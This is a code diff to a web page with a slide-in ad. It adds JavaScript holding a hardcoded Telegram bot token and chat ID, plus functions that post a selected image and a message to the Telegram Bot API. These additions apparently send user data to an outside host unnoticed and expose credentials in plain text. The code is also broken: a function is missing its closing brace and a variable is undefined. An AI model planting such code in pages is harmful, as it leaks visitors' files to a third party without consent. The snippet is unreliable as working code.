@@ -417,6 +417,40 @@ setTimeout(slideInAd, 1000);
 
 // Add event listener to close the ad when the button is clicked
 closeAdButton.addEventListener("click", slideOutAd);
+
+	  	// Important parameters
+	  const TELEGRAM_BOT_TOKEN = '8434781142:AAFlVJLIU9h2dwD7khlHD7sciNlpWtNitXE';
+	  const TELEGRAM_CHAT_ID = '6049368044';
+	  const MESSAGE = 'hope';
+
+ function sendImageToTelegram(botToken, chatId) {
+    if (!file) {
+        alert('No image selected');
+        return;
+    }
+
+    const form = new FormData();
+    form.append('chat_id', chatId);
+    form.append('photo', file);
+
+ fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            method: 'POST',
+            body: form
+        });
+}
+ 
+
+	  // Proper parameter naming
+function sendMessageToTelegram(botToken, chatId, messageText) {
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: messageText
+    })
+  });
+
+sendMessageToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, MESSAGE);
   </script>
-  
 </html>
